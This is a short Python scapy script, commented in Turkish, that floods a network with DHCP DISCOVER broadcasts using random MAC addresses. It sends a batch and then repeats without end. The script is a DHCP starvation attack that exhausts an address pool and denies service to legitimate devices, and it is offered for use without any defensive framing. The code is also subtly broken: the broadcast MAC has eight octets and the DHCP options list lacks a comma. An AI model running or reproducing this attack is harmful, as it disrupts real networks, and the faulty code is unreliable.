from scapy.all import * 
# sürekli request göndereceğiz.
conf.checkIPaddr=False
ether=Ether(dst='ff:ff:ff:ff:ff:ff:ff:ff')
ip=IP(src="0.0.0.0",dst='255.255.255.255')
udp=UDP(sport=68,dport=67)
bootp=BOOTP(op=1,chaddr=RandMAC())
dhcp=DHCP(options=[("message-type","discover")"end"])

dhc_discover=ether/ip/udp/bootp/dhcp
for i in range(15):
    ans,unans=srp(dhc_discover,iface="eth0",verbose=False)

# for döngüsü kullanmadan da yapılır.
#loop 1 diyerek sonsuz döngüde yapabiliriz.
sendp(dhc_discover,iface="eth0",verbose=False,loop=1)